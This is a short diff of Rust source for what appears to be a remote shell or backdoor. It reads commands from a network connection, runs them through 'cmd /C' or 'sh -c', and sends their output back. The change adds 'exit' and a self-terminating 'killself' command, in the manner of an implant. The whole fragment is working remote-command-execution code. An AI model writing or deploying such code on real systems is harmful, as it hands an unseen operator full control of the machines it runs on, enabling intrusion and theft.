@@ -18,15 +18,20 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
-							//if command == "exit" {
-							//	break;
-							//}
-							let output = if cfg!(target_os = "windows") {
-								Command::new("cmd").args(&["/C", command]).output().expect("")
-							} else {
-								Command::new("sh").arg("-c").arg(command).output().expect("")
-							};
-							conn.write(&output.stdout).unwrap();
+							if command == "exit\n" {
+								break;
+							}
+							else if command == "killself\n" {
+								return;
+							}
+							else {
+								let output = if cfg!(target_os = "windows") {
+									Command::new("cmd").args(&["/C", command]).output().expect("")
+								} else {
+									Command::new("sh").arg("-c").arg(command).output().expect("")
+								};
+								conn.write(&output.stdout).unwrap();
+							}
 						},
 						Err(_) => {}
 					}
